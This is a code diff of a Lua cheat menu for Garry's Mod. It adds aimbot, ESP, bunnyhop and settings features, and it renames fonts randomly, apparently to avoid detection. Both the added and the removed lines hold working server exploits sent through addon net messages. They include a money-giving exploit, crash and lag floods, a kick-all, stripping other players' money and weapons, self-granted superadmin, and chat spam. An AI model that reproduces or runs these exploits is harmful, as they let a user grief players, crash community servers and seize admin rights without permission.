@@ -1,42 +1,25 @@
-local AimbotPoints = {}
+require("bsendpacket")
 
+
+local pMenu = {}
+local pMenuVars = { 
+	Tabs = {},
+	Sliders = {},
+	CheckBoxes = {},
+	Function_Buttons = {}
+}
+
+local AimbotPoints = {}
 AimbotPoints[1] = {bone = "ValveBiped.Bip01_Head1"}
 AimbotPoints[2] = {bone = "ValveBiped.Bip01_Neck1"}
 AimbotPoints[3] = {bone = "ValveBiped.Bip01_Spine4"}
 AimbotPoints[4] = {bone = "ValveBiped.Bip01_Spine2"}
 AimbotPoints[5] = {bone = "ValveBiped.Bip01_Spine"}
-surface.CreateFont( "Font L", {
-	font = "Courier New",
-	size = 18,
-	weight = 300,
-} )
-surface.CreateFont( "Font M", {
-	font = "Courier New",
-	size = 15,
-	weight = 300,
-} )
-surface.CreateFont( "Font L2", {
-	font = "Verdana",
-	extended = false,
-	size = 12,
-	weight = 1000,
-	blursize = 0,
-	scanlines = 0,
-	shadow = true,
-	antialias = true
-} )
-// if you're going to use this for your paste atleast give me credit :)
-// CFour - /id/BordersClosed/
-local pMenu = {} // functions
-local pMenuVars = {
-	Tabs = {},
-	Sliders = {},
-	CheckBoxes = {},
-	Exploits = {}
-} // store values to be used at a later time
-local BigExploits = {}
+local BigExploits = {} 
 local PI = 3.14159265359;
 local Rad = 180 / PI
+local backtrackamt = 0.5;
+local BackTrack = {}
 function pMenu.IsNetString(netstring)
 	local validate,_ = pcall( net.Start, netstring )
 	if validate then
@@ -50,346 +33,76 @@ function pMenu.RandomString(len)
 	end
 	local ret = ""
 	for i=1,len do
-		ret = ret..string.char(math.random(33,126)) // fist 32 of ascii is pretty much garbage, I don't want spaces so we're skipping 32.
-	end                                             // also I don't think gmod uses extended ascii 
+		ret = ret..string.char(math.random(33,126))
+	end                                             
 	return ret
 end
-BigExploits["Duel Moniez"] = {func = 
-function() 
-	if pMenu.IsNetString("duelrequestguiYes") then
+
+
+BigExploits["Duel Moniez"] = {
+	TopText = "Dueling",
+	BottomText = "Give b1g money",
+	should_draw = true, //pMenu.IsNetString(string) can be used
+	func = function() 
 		net.Start("duelrequestguiYes")
-		net.WriteInt(-2147483648,32) // b1g 32 bit int laff -> -99999999999999999999999999999999999999999999999999999999999999999999999999999
+		net.WriteInt(-2147483648,32)
 		net.WriteEntity(table.Random( player.GetAll() ) )
 		net.WriteString("Crossbow")
 		net.SendToServer()
 	end
-end
 }
-BigExploits["Drugsmod remove all weapons?"] = {func = 
-function() 
-	if pMenu.IsNetString("drugseffect_remove") then
-		net.Start("drugseffect_remove")
-	    net.SendToServer()
-	end
-end
-}
-BigExploits["Drugsmod remove all money?"] = {func = 
-function()
-	if pMenu.IsNetString("drugs_money") then
-		net.Start("drugs_money")
-	    net.SendToServer()
-	end
-end
-}
-BigExploits["Drugsmod ignite all props?"] = {func = 
-function() 
-	if pMenu.IsNetString("drugs_ignite") then
-		net.Start("drugs_ignite")
-	    net.WriteString("prop_physics")
-	    net.SendToServer()
-	end
-end
-}
-BigExploits["Drugsmod remove all props?"] = {func = 
-function() 
-	if pMenu.IsNetString("drugs_text") then
-		net.Start("drugs_text")
-	    net.WriteString("prop_physics")
-	    net.SendToServer()
-	end
-end
-}
-BigExploits["TGN Advanced Money Printer Take Monie"] = {func = 
-function()
-	if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
-		for _,v in pairs(ents.FindByClass("adv_moneyprinter")) do
-			if v:IsValid() then
-				net.Start( "SyncPrinterButtons76561198056171650" )
-	            net.WriteEntity(v)
-	    		net.WriteUInt(2, 4)
-	    		net.SendToServer()
+
+local FontL = pMenu.RandomString(10)
+local FontM = pMenu.RandomString(10)
+local FontL2 = pMenu.RandomString(10)
+surface.CreateFont( FontL, {
+	font = "Courier New",
+	size = 18,
+	weight = 300,
+} )
+surface.CreateFont( FontM, {
+	font = "Courier New",
+	size = 15,
+	weight = 300,
+} )
+surface.CreateFont( FontL2, {
+	font = "Verdana",
+	extended = false,
+	size = 12,
+	weight = 1000,
+	blursize = 0,
+	scanlines = 0,
+	shadow = true,
+	antialias = true
+} )
+
+function pMenu.SaveSettings()
+	local EndTable = {
+		Sliders = {},
+		CheckBoxes = {}
+	}
+	for _k,_v in pairs(EndTable) do
+		for k,v in pairs(pMenuVars[_k]) do
+			if k[1] == "S" && k[2] == "T" && k[3] == "E" && k[4] == "A" && k[5] == "M" then // dont save any plist vars remove it if you want to.
+				continue;	  																// just don't want the file & table to fucking massive
+			else
+				_v[k] = v
 			end
 		end
 	end
+	file.Write( "_b1g_settings.txt",util.TableToJSON(EndTable,true))
 end
-}
-	
-BigExploits["Logging thing Kick All players?"] = {func = 
-function()
-	if pMenu.IsNetString("DL_Answering") then
-		local function reportQuestionmark()
-			for i = 1, 2000 do 
-		        net.Start("DL_Answering")
-		        net.SendToServer()
-		    end
-		end
-		timer.Create(pMenu.RandomString(20),0.1,50,reportQuestionmark)
+function pMenu.GetSettings()
+	if !file.Exists("_b1g_settings.txt","DATA") then
+		return pMenuVars;
 	end
+	return util.JSONToTable(file.Read( "_b1g_settings.txt", "DATA" ))
 end
-}
-BigExploits["SimplicityAC Crash Server"] = {func = 
-function()
-	if pMenu.IsNetString("SimplicityAC_aysent") then
-		local tbl = {}
-		for i=1,1000 do
-			tbl[i] = i;
-		end
-		net.Start("SimplicityAC_aysent")
-	 
-	    net.WriteUInt(1, 8)
-	 
-	    net.WriteUInt(4294967295, 32)
-	 
-	    net.WriteTable(tbl)
-	 
-	    net.SendToServer()
-	end
+function pMenu.LoadSettings()
+	local settings = pMenu.GetSettings();
+	pMenuVars["Sliders"] = settings["Sliders"];
+	pMenuVars["CheckBoxes"] = settings["CheckBoxes"];
 end
-}
-BigExploits["Auzlex's Teleport System Lag"] = {func = 
-function()
-	if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
-		timer.Create(pMenu.RandomString(20),0.05,6000,function()
-			for k,v in pairs(player.GetAll()) do
-				net.Start( "ATS_WARP_REMOVE_CLIENT" )
-	 			net.WriteEntity( v )
-				net.WriteString( "adminroom1" )
-				net.SendToServer()
-				net.Start( "ATS_WARP_FROM_CLIENT" )
-				net.WriteEntity( v )
-				net.WriteString( "adminroom1" )
-				net.SendToServer()
-				net.Start( "ATS_WARP_VIEWOWNER" )
-				net.WriteEntity( v )
-				net.WriteString( "adminroom1" )
-				net.SendToServer()
-			end
-		end)
-	end
-end
-}
-BigExploits["Lagger 2"] = {func = 
-function()
-	if pMenu.IsNetString("CFRemoveGame") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for k,v in pairs(player.GetAll()) do
-				net.Start( "CFRemoveGame" )
-				net.WriteFloat( math.Round( "10000\n" ) )
-				net.SendToServer()
-				net.Start( "CFJoinGame" )
-				net.WriteFloat( math.Round( "10000\n" ) )
-				net.SendToServer()
-				net.Start( "CFEndGame" )
-				net.WriteFloat( "10000\n" )
-				net.SendToServer()
-			end
-		end)
-	end
-end
-}
-BigExploits["Lagger 3"] = {func = 
-function()
-	if pMenu.IsNetString("CreateCase") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i = 1, 300 do
-				net.Start( "CreateCase" )
-				net.WriteString( "tapped by b1g hack from citizenhack.me" )
-  				net.SendToServer()
-  			end
-		end)
-	end
-end
-}
-BigExploits["Lagger 4"] = {func = 
-function()
-	if pMenu.IsNetString("rprotect_terminal_settings") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i = 1, 200 do
-				net.Start( "rprotect_terminal_settings" )
-				net.WriteEntity( LocalPlayer() )
-				net.SendToServer()
-  			end
-		end)
-	end
-end
-}
-BigExploits["Lagger 5"] = {func = 
-function()
-	if pMenu.IsNetString("StackGhost") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i = 1, 8 do
-		        for k,v in pairs( player.GetAll() ) do
-			        net.Start( "StackGhost" )
-			        net.WriteInt(69,32)
-			        net.SendToServer()
-			    end
-			end
-		end)
-	end
-end
-}
-BigExploits["Lagger 6"] = {func = 
-function()
-	if pMenu.IsNetString("JoinOrg") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for k,v in pairs(player.GetAll()) do
-				net.Start("JoinOrg")
-					net.WriteEntity(LocalPlayer())
-					net.WriteString("test")
-				net.SendToServer()                         
-		    end
-		end)
-	end
-end
-}
-BigExploits["Lagger 7"] = {func = 
-function()
-	if pMenu.IsNetString("pac_submit") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i=1, 1800 do
-				net.Start("pac_submit")
-				net.SendToServer()
-			end
-		end)
-	end
-end
-}
-
-BigExploits["Lagger 8"] = {func = 
-function()
-	if pMenu.IsNetString("steamid2") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i = 1, 300 do
-				net.Start( "steamid2" )
-				net.WriteString( "S P I C Y " )
-				net.SendToServer()
-			end
-		end)
-	end
-end
-}
-BigExploits["Lagger 9"] = {func = 
-function()
-	if pMenu.IsNetString("NDES_SelectedEmblem") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i=1, 2000 do
-				net.Start("NDES_SelectedEmblem")
-				net.WriteString("exploitcity has to be a joke they can be for real.")
-				net.SendToServer()
-			end
-		end)
-	end
-end
-}
-BigExploits["Lagger 10"] = {func = 
-function()
-	if pMenu.IsNetString("join_disconnect") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i=1, 3000 do
-				net.Start("join_disconnect")
-				net.WriteEntity(table.Random(player.GetAll()))
-				net.SendToServer()
-			end
-		end)
-	end
-end
-}
-BigExploits["PAC Crash Server old"] = {func = 
-function()
-	if pMenu.IsNetString("pac_to_contraption") then
-		local tbl = {}
- 
-		for i=1,1000000000 do
- 
-			tbl[#tbl + 1] = i
- 
-		end
- 
-		net.Start("pac_to_contraption")
-		 
-		net.WriteTable( tbl )
-		 
-		net.SendToServer()
-	end
-end
-}
-BigExploits["NLRKick"] = {func = 
-function()
-	if pMenu.IsNetString("NLRKick") then
-		for k,v in pairs(player.GetAll()) do
-			if v == LocalPlayer() then
-				continue;
-			end
-			net.Start("NLRKick")
-			net.WriteEntity(v)
-			net.SendToServer()
-		end
-	end
-end
-}
-BigExploits["B1g Crasher"] = {func = 
-function()
-	if pMenu.IsNetString("Morpheus.StaffTracker") then
-		timer.Create(pMenu.RandomString(20),0.02,15000,function()
-			for i=1, 2000 do
-                net.Start("Morpheus.StaffTracker")
-                net.SendToServer()
-			end
-		end)
-	end
-end
-}
-BigExploits["Give superadmin"] = {func = 
-function()
-	if pMenu.IsNetString("pplay_deleterow") then
-		local id = LocalPlayer():SteamID()
-		local tbl = {}
-		tbl.name = "FAdmin_PlayerGroup"
-		tbl.where = {"steamid",tostring(id)}
-
-		net.Start("pplay_deleterow")
-
-		net.WriteTable(tbl)
-
-		net.SendToServer()
-
-
-
-		local tbl = {}
-
-		tbl.tblname = "FAdmin_PlayerGroup"
-
-		tbl.tblinfo = {tostring(id),"superadmin"}
-
-		net.Start("pplay_addrow")
-
-		net.WriteTable(tbl)
-		net.SendToServer()
-	end
-end
-}
-BigExploits["pm spam"] = {func = 
-function()
-	timer.Create(pMenu.RandomString(20),5,10,function()
-		for k,v in pairs(player.GetAll()) do
-			if v == LocalPlayer() then
-				continue;
-			end
-			LocalPlayer():ConCommand("ulx psay "..v:Nick().." server rekt by "..LocalPlayer():Nick())
-		end
-	end)
-end
-}
-BigExploits["asay spam"] = {func = 
-function()
-	timer.Create(pMenu.RandomString(20),1.1,10,function()
-		for i=1, ((1/FrameTime())) do
-			LocalPlayer():ConCommand("ulx asay"..'"Thats pretty spicy dude lol"')
-		end
-	end)
-end
-}
-
 function pMenu.MouseInArea(frame,minx,miny,maxx,maxy)
 	local PosX,PosY = frame:GetPos()
 	local posx,posy = gui.MousePos();
@@ -445,7 +158,7 @@ function pMenu.DrawSlider(frame,x,y,w,h,slider,min,max,startval,round)
 	local val = pMenuVars.Sliders[slider].value;
 	local slid = (w - 10) / (max) * (val - min)
 	pMenu.DrawRect(x + slid,y,10,h,Color(18,89,131,255))
-	draw.SimpleText(val,"Font M",x + (w/2),y + 2,Color(255,255,255,255),TEXT_ALIGN_CENTER)
+	draw.SimpleText(val,FontM,x + (w/2),y + 2,Color(255,255,255,255),TEXT_ALIGN_CENTER)
 	pMenu.DrawOutLinedRect(x,y, w , h , Color( 0,255,255, 200 ))
 end
 function pMenu.DrawCheckBox(frame,x,y,CBOX,defvalue,text)
@@ -471,7 +184,33 @@ function pMenu.DrawCheckBox(frame,x,y,CBOX,defvalue,text)
 	if pMenuVars.CheckBoxes[CBOX].value then
 		pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,89,131,255))
 	end
-	draw.SimpleText(text,"Font M",x + w + 5,y + 2,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+	draw.SimpleText(text,FontM,x + w + 5,y + 2,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+end
+
+function pMenu.DrawDropDown(frame,x,y,CBOX,defvalue,text,tbl) // unfinished lol lazy
+	local w,h = 70,20
+	if pMenuVars.CheckBoxes[CBOX] == nil then
+		pMenuVars.CheckBoxes[CBOX] = {value = defvalue,tez = 0}
+	end
+	local PosX,PosY = frame:GetPos()
+	local NewX,NewY = PosX + x,PosY + y
+	pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
+	pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
+	if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.CheckBoxes[CBOX].value then
+		pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,59,101,255))
+	end
+	if input.IsMouseDown(MOUSE_LEFT) then
+		pMenuVars.CheckBoxes[CBOX].tez = pMenuVars.CheckBoxes[CBOX].tez + 1
+	else
+		pMenuVars.CheckBoxes[CBOX].tez = 0;
+	end
+	if pMenuVars.CheckBoxes[CBOX].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
+		pMenuVars.CheckBoxes[CBOX].value = !pMenuVars.CheckBoxes[CBOX].value;
+	end
+	if pMenuVars.CheckBoxes[CBOX].value then
+		pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,89,131,255))
+	end
+	draw.SimpleText(text,FontM,x + 5,y + 2,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 end
 
 function pMenu.DrawTab(frame,x,y,w,h,NAME,defvalue)
@@ -491,16 +230,21 @@ function pMenu.DrawTab(frame,x,y,w,h,NAME,defvalue)
 	end
 	if pMenuVars.Tabs[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
 		pMenuVars.Tabs[NAME].value = !pMenuVars.Tabs[NAME].value;
+		for k,v in pairs(pMenuVars.Tabs) do
+			if k != NAME && v.value == true then
+				v.value = false;
+			end
+		end
 	end
 	if pMenuVars.Tabs[NAME].value then
 		pMenu.DrawRect(x,y,w,h,Color(18,89,131,255))
 	end
 	pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
-	draw.SimpleText(NAME,"Font L",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
+	draw.SimpleText(NAME,FontL,x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
 end
-function pMenu.DrawExploit(frame,x,y,w,h,NAME,func,text1,text2)
-	if pMenuVars.Exploits[NAME] == nil then
-		pMenuVars.Exploits[NAME] = {func = func,tez = 0}
+function pMenu.DrawFunctionButton(frame,x,y,w,h,NAME,func,text1,text2)
+	if pMenuVars.Function_Buttons[NAME] == nil then
+		pMenuVars.Function_Buttons[NAME] = {func = func,tez = 0}
 	end
 	local PosX,PosY = frame:GetPos()
 	local NewX,NewY = PosX + x,PosY + y
@@ -509,24 +253,25 @@ function pMenu.DrawExploit(frame,x,y,w,h,NAME,func,text1,text2)
 		pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
 	end
 	if input.IsMouseDown(MOUSE_LEFT) then
-		pMenuVars.Exploits[NAME].tez = pMenuVars.Exploits[NAME].tez + 1
+		pMenuVars.Function_Buttons[NAME].tez = pMenuVars.Function_Buttons[NAME].tez + 1
 	else
-		pMenuVars.Exploits[NAME].tez = 0;
+		pMenuVars.Function_Buttons[NAME].tez = 0;
 	end
-	if pMenuVars.Exploits[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
-		pMenuVars.Exploits[NAME].func();
+	if pMenuVars.Function_Buttons[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
+		pMenuVars.Function_Buttons[NAME].func();
 	end
 	pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
 	if text2 == nil then
-		draw.SimpleText(text1,"Font M",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
+		draw.SimpleText(text1,FontM,x + w/2,y + h/2 - 1,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
 	else
-		draw.SimpleText(text1,"Font M",x + w/2,y + h/2 - 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
-		draw.SimpleText(text2,"Font M",x + w/2,y + h/2 + 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
+		draw.SimpleText(text1,FontM,x + w/2,y + h/2 - 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
+		draw.SimpleText(text2,FontM,x + w/2,y + h/2 + 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
 	end
 end
 local firsttime = true
 local Frame = NULL;
-
+local IsFake = false;
+local shotz = 0;
 
 
 
@@ -545,17 +290,22 @@ function pMenu.Menu()
 		pMenu.DrawRect(5, 25, 125, h - 30, Color( 18,89,131, 100 ))
 		pMenu.DrawOutLinedRect(5, 25, 125, h - 30, Color( 0,255,255, 200 ))
 		pMenu.DrawOutLinedRect(135, 25, w - 140, h - 30, Color( 0,255,255, 200 ))
-		draw.SimpleText("B1g Menu v6 public","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
+		draw.SimpleText("B1g Meme",FontL,w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
 		local Aimbot = "Aimbot";
 		local Visuals = "Visuals";
 		local b1gExploits = "Exploits"
 		local misc = "MISC"
 		local hvh = "HvH"
+		local test = "Test"
 		pMenu.DrawTab(Frame,10,30,115,50,Aimbot,true)
 		pMenu.DrawTab(Frame,10,85,115,50,Visuals,true)
 		pMenu.DrawTab(Frame,10,140,115,50,b1gExploits,true)
 		pMenu.DrawTab(Frame,10,195,115,50,misc,true) 
-		pMenu.DrawTab(Frame,10,250,115,50,hvh,true) 
+		pMenu.DrawTab(Frame,10,250,115,50,hvh,true)
+
+		pMenu.DrawFunctionButton(Frame,10,h - 75,115,30,"Load Settings Button",pMenu.LoadSettings,"Load Settings")
+		pMenu.DrawFunctionButton(Frame,10,h - 40,115,30,"Save Settings Button",pMenu.SaveSettings,"Save Settings")
+
 		if pMenuVars.Tabs[Visuals].value then
 			pMenu.DrawCheckBox(Frame,170,55,"ESP",true,"Enable ESP")
 
@@ -565,175 +315,137 @@ function pMenu.Menu()
 			pMenu.DrawCheckBox(Frame,150,145,"ESP BoundingBox",true,"Bounding Box")
 			pMenu.DrawCheckBox(Frame,150,175,"ESP HealthBar",true,"Health Bar")
 			pMenu.DrawCheckBox(Frame,150,205,"ESP Traceline",true,"Eye Traceline")
-			draw.SimpleText("Traceline Distance","Font M",150,237,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Traceline Distance",FontM,150,237,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,150,265,210,20,"ESP Traceline Distance",25,  250,  71)
-			pMenu.DrawCheckBox(Frame,150,295,"ESP Position",true,"Position")
-			pMenu.DrawCheckBox(Frame,150,325,"ESP Angles",true,"Eye Angles")
-			pMenu.DrawCheckBox(Frame,150,355,"ESP Glow",false,"Glow")
-			pMenu.DrawCheckBox(Frame,150,385,"ESP Chams",false,"Chams")
-			pMenu.DrawCheckBox(Frame,150,415,"ESP XQZ",false,"XQZ")
-			pMenu.DrawCheckBox(Frame,150,445,"ESP WeaponCham",false,"Weapon Chams")
+			pMenu.DrawCheckBox(Frame,150,295,"ESP Position",false,"Position")
+			pMenu.DrawCheckBox(Frame,150,325,"ESP Angles",false,"Eye Angles")
+			pMenu.DrawCheckBox(Frame,150,355,"ESP Glow",true,"Glow")
+			pMenu.DrawCheckBox(Frame,150,385,"ESP Chams",true,"Chams")
+			pMenu.DrawCheckBox(Frame,150,415,"ESP XQZ",true,"XQZ")
+			pMenu.DrawCheckBox(Frame,150,445,"ESP WeaponCham",true,"Weapon Chams")
 
 
-			draw.SimpleText("Box Color","Font M",390,35,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			draw.SimpleText("R","Font M",660,55,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Box Color",FontM,390,35,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("R",FontM,660,55,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,55,260,20,"ESP BoxColor.r",0,  255,  255)
-			draw.SimpleText("G","Font M",660,80,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("G",FontM,660,80,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,80,260,20,"ESP BoxColor.g",0,  255,  0)
-			draw.SimpleText("B","Font M",660,105,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("B",FontM,660,105,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,105,260,20,"ESP BoxColor.b",0,  255,  255)
 
-			draw.SimpleText("Text Color","Font M",390,130,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			draw.SimpleText("R","Font M",660,150,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Text Color",FontM,390,130,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("R",FontM,660,150,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,150,260,20,"ESP TextColor.r",0,  255,  255)
-			draw.SimpleText("G","Font M",660,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("G",FontM,660,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,175,260,20,"ESP TextColor.g",0,  255,  206)
-			draw.SimpleText("B","Font M",660,200,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("B",FontM,660,200,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,200,260,20,"ESP TextColor.b",0,  255,  121)
 
-			draw.SimpleText("Chams Visible","Font M",390,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			draw.SimpleText("R","Font M",660,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Chams Visible",FontM,390,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("R",FontM,660,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,250,260,20,"ESP ChamVisColor.r",0,  255,  10)
-			draw.SimpleText("G","Font M",660,275,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("G",FontM,660,275,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,275,260,20,"ESP ChamVisColor.g",0,  255,  206)
-			draw.SimpleText("B","Font M",660,300,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("B",FontM,660,300,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,300,260,20,"ESP ChamVisColor.b",0,  255,  4)
 
-			draw.SimpleText("Chams Non-Visible","Font M",390,325,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			draw.SimpleText("R","Font M",660,350,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Chams Non-Visible",FontM,390,325,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("R",FontM,660,350,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,350,260,20,"ESP ChamNVisColor.r",0,  255,  70)
-			draw.SimpleText("G","Font M",660,375,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("G",FontM,660,375,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,375,260,20,"ESP ChamNVisColor.g",0,  255,  70)
-			draw.SimpleText("B","Font M",660,400,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("B",FontM,660,400,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,390,400,260,20,"ESP ChamNVisColor.b",0,  255,  255)
 
 			pMenu.Drawline(375,30,375,490,Color(0,255,255,255))
 		end
 		if pMenuVars.Tabs[misc].value then
 			pMenu.DrawCheckBox(Frame,170,55,"MISC Thirdperson",false,"Enable ThirdPerson")
-			draw.SimpleText("Distance","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			pMenu.DrawSlider(Frame,170,105,260,20,"MISC Thirdperson Distance",10,  300,  100)
-			pMenu.DrawCheckBox(Frame,170,135,"MISC Bhop",false,"Enable Bunnyhop")
-			pMenu.DrawCheckBox(Frame,170,165,"MISC Autostrafe",false,"Enable Autostrafe")
+			draw.SimpleText("Distance",FontM,170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			pMenu.DrawSlider(Frame,170,105,260,20,"MISC Thirdperson Distance",10,  1000,  100)
+			pMenu.DrawCheckBox(Frame,170,135,"MISC Bhop",true,"Enable Bunnyhop")
+			pMenu.DrawCheckBox(Frame,170,165,"MISC Autostrafe",true,"Enable Autostrafe")
 			pMenu.DrawCheckBox(Frame,170,195,"MISC Text to speech is fucking aids",false,"Enable Text to Speech")
+			pMenu.DrawCheckBox(Frame,170,225,"MISC Night-mode",true,"Enable Night-mode")
+			pMenu.DrawCheckBox(Frame,170,255,"MISC CStrafe",true,"Enable Circle Strafe (E to use (pretty ass))")
 		end
+
+		// this looks like trash holyshit should have used in pairs
 		if pMenuVars.Tabs[b1gExploits].value then
-			if pMenu.IsNetString("duelrequestguiYes")then
-				pMenu.DrawExploit(Frame,140,30,170,50,"Duel Moniez",BigExploits["Duel Moniez"].func,"Dueling","Give b1g money")
+			// 8 max
+			local explotcount = 0;
+			local row = 0;
+			for k,v in pairs(BigExploits) do
+				local num = explotcount % 8;
+				if num == 0 && explotcount >= 8 then
+					row = row + 1;
+				end
+				if v.should_draw then
+					pMenu.DrawFunctionButton(Frame,140 + (175 * row),30 + (55 * num),170,50,k,v.func,v.TopText,v.BottomText)
+					explotcount = explotcount + 1;
+				end
 			end
-			if pMenu.IsNetString("drugseffect_remove") then
-				pMenu.DrawExploit(Frame,140,85,170,50,"Drugsmod remove all weapons?",BigExploits["Drugsmod remove all weapons?"].func,"Drugsmod","Strip all Weapons?")
-			end
-			if pMenu.IsNetString("drugs_money") then
-				pMenu.DrawExploit(Frame,140,140,170,50,"Drugsmod remove all money?",BigExploits["Drugsmod remove all money?"].func,"Drugsmod","Remove all money?")
-			end
-			if pMenu.IsNetString("drugs_ignite") then
-				pMenu.DrawExploit(Frame,140,195,170,50,"Drugsmod ignite all props?",BigExploits["Drugsmod ignite all props?"].func,"Drugsmod","ignite all props?")
-			end
-			if pMenu.IsNetString("drugs_text") then
-				pMenu.DrawExploit(Frame,140,250,170,50,"Drugsmod remove all props?",BigExploits["Drugsmod remove all props?"].func,"Drugsmod","Remove all props?")
-			end
-			if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
-				pMenu.DrawExploit(Frame,140,305,170,50,"TGN Advanced Money Printer Take Monie",BigExploits["TGN Advanced Money Printer Take Monie"].func,"TGN Advanced Printer","Take all money")
-			end
-			if pMenu.IsNetString("DL_Answering") then
-				pMenu.DrawExploit(Frame,140,360,170,50,"Logging thing Kick All players?",BigExploits["Logging thing Kick All players?"].func,"Logging thing","Kick all players")
-			end
-			if pMenu.IsNetString("SimplicityAC_aysent") then
-				pMenu.DrawExploit(Frame,140,415,170,50,"SimplicityAC Crash Server",BigExploits["SimplicityAC Crash Server"].func,"SimplicityAC","Crash Server")
-			end
-			if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
-				pMenu.DrawExploit(Frame,315,30,170,50,"Auzlex's Teleport System Lag",BigExploits["Auzlex's Teleport System Lag"].func,"Auzlex's Teleport System","Lag Server for 5 min")
-			end
-			if pMenu.IsNetString("CFRemoveGame") then
-				pMenu.DrawExploit(Frame,315,85,170,50,"Lagger 2",BigExploits["Lagger 2"].func,"Lagger 2 (5 min)")
-			end
-			if pMenu.IsNetString("CreateCase") then
-				pMenu.DrawExploit(Frame,315,140,170,50,"Lagger 3",BigExploits["Lagger 3"].func,"Lagger 3 (5 min)")
-			end
-			if pMenu.IsNetString("rprotect_terminal_settings") then
-				pMenu.DrawExploit(Frame,315,195,170,50,"Lagger 4",BigExploits["Lagger 4"].func,"Lagger 4 (5 min)")
-			end
-			if pMenu.IsNetString("StackGhost") then
